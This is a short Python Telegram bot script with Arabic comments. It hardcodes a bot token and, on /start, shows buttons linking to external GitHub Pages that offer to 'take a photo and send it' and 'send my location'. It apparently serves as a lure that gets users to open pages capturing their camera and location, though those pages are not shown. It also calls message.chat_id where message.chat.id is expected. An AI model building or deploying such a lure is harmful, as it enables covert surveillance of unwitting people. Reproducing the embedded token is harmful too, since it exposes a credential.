import telebot
from telebot import types

# ضع التوكن الخاص بك هنا
TOKEN = '8299064937:AAEpvoZDD9u3yiZtyHqVqHVziihGk-IdPDc'
bot = telebot.TeleBot(TOKEN)

# روابط صفحاتك التي رفعتها على GitHub
URL_CAMERA = "https://11gkk-wq.github.io/camera.html" # تأكد من الاسم
URL_LOCATION = "https://11gkk-wq.github.io/" 

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    # إنشاء الأزرار
    btn_cam = types.InlineKeyboardButton("📸 التقاط صورة وإرسالها", url=URL_CAMERA)
    btn_loc = types.InlineKeyboardButton("📍 إرسال موقعي الآن", url=URL_LOCATION)
    
    markup.add(btn_cam, btn_loc)
    
    bot.send_message(message.chat_id, "أهلاً بك في خزانتك الخاصة! اختر ماذا تريد أن تفعل:", reply_markup=markup)

print("البوت يعمل الآن...")
bot.polling()
